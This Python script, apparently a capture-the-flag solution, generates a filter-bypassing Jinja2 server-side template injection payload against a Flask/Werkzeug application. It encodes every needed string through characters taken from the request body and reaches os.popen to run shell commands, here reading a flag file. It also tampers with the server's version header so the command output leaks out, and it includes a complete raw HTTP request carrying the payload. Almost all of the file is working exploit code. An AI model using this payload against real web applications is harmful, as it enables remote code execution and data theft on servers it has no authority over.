# -*- encoding: utf-8 -*-
'''
@File    :   exploit.py
@Time    :   2025/01/27 17:46:11
@Author  :   LamentXU 
'''

# Please fly little dreams.

import re
payload = []
def generate_rce_command(cmd):
    global payload
    payloadstr = """{%set%0asub=request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('subprocess')%}{%set%0aso=request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')%}{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('importlib')|attr('reload')(sub))%}{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('importlib')|attr('reload')(so))%}{%print(g|attr('pop')|attr('__globals__')|attr('get')('__builtins__')|attr('get')('setattr')(g|attr('pop')|attr('__globals__')|attr('get')('sys')|attr('modules')|attr('get')('werkzeug')|attr('serving')|attr('WSGIRequestHandler'),'server_version',g|attr('pop')|attr('__globals__')|attr('get')('__builtins__')|attr('get')('__import__')('os')|attr('popen')('"""+cmd+"""')|attr('read')()))%}"""

    required_encoding = re.findall('\'([a-z0-9_ /\.]+)\'', payloadstr)
    # print(required_encoding)
    required_encoding.append('WSGIRequestHandler')
    offset_a = 16
    offset_0 = 6
    offset_A = 42
    encoded_payloads = {}

    arg_count = 0
    for i in required_encoding:
        print(i)
        if i not in encoded_payloads:
            p = []
            for j in i:
                if j == '_':
                    p.append('k.2')
                elif j == ' ':
                    p.append('k.3')
                elif j == '.':
                    p.append('k.4')
                elif j == '-':
                    p.append('k.5')
                elif j.isnumeric():
                    a = str(ord(j)-ord('0')+offset_0)
                    p.append(f'k.{a}')
                elif j == '/':
                    p.append('k.68')
                elif j == '/':
                    p.append('k.69')
                elif ord(j) >= ord('a') and ord(j) <= ord('z'):
                    a = str(ord(j)-ord('a')+offset_a)
                    p.append(f'k.{a}')
                elif ord(j) >= ord('A') and ord(j) <= ord('Z'):
                    a = str(ord(j)-ord('A')+offset_A)
                    p.append(f'k.{a}')
            arg_name = f'a{arg_count}'
            encoded_arg = '{%' + '%0a'.join(['set', arg_name , '=', '~'.join(p)]) + '%}'
            encoded_payloads[i] = (arg_name, encoded_arg)
            arg_count+=1
            payload.append(encoded_arg)
    # print(encoded_payloads)
    fully_encoded_payload = payloadstr
    for i in encoded_payloads.keys():
        if i in fully_encoded_payload:
            fully_encoded_payload = fully_encoded_payload.replace("'"+ i +"'", encoded_payloads[i][0])
    # print(fully_encoded_payload)
    payload.append(fully_encoded_payload)
command = "cat /flag_h3r3 | base64"
full_payload = '''{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('" + cmd + "')|attr('read')())%}'''
endpoint = "r3al_ins1de_thought"
payload.append(r'{%for%0ai%0ain%0arequest.endpoint|slice(1)%}')
word_data = ''
for i in 'data':
    word_data += 'i.' + str(endpoint.find(i)) + '~'
word_data = word_data[:-1] # delete the last '~'
# Now we have "data"
print("data: "+word_data)
payload.append(r'{%set%0adat='+word_data+'%}')
payload.append(r'{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}')
generate_rce_command(command)
# payload.append(r'{%print(j)%}')
# Here we use the "data" to construct the payload
print('request body: _ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/|')
# use chr() to convert the number to character
# hiahiahia~ Now we get all of the charset, SSTI go go go!


payload.append(r'{%endfor%}')
payload.append(r'{%endfor%}')
output = ''.join(payload)

print(r"fly-"+output)

"""
GET /H3dden_route?My_ins1de_w0r1d=I%20will%20burn%20those%20who%20dare%20to%20care%20for%20me.%20{%for%0ai%0ain%0arequest.endpoint|slice(1)%}{%set%0aslash=request.path.0%}{%set%0adat=i.9~i.2~i.12~i.2%}{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}{%set%0aa0%0a=%0ak.16~k.31~k.31~k.27~k.24~k.18~k.16~k.35~k.24~k.30~k.29%}{%set%0aa1%0a=%0ak.2~k.2~k.22~k.27~k.30~k.17~k.16~k.27~k.34~k.2~k.2%}{%set%0aa2%0a=%0ak.2~k.2~k.22~k.20~k.35~k.24~k.35~k.20~k.28~k.2~k.2%}{%set%0aa3%0a=%0ak.2~k.2~k.17~k.36~k.24~k.27~k.35~k.24~k.29~k.34~k.2~k.2%}{%set%0aa4%0a=%0ak.2~k.2~k.24~k.28~k.31~k.30~k.33~k.35~k.2~k.2%}{%set%0aa5%0a=%0ak.30~k.34%}{%set%0aa6%0a=%0ak.31~k.30~k.31~k.20~k.29%}{%set%0aa7%0a=%0ak.18~k.16~k.35~k.3~slash~k.21~k.27~k.16~k.22~k.2~k.23~k.9~k.33~k.9%}{%set%0aa8%0a=%0ak.33~k.20~k.16~k.19%}{%print(request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a5)|attr(a6)(a7)|attr(a8)())%}{%endfor%}{%endfor%} HTTP/1.1
Host: XXX
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 66

_ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
"""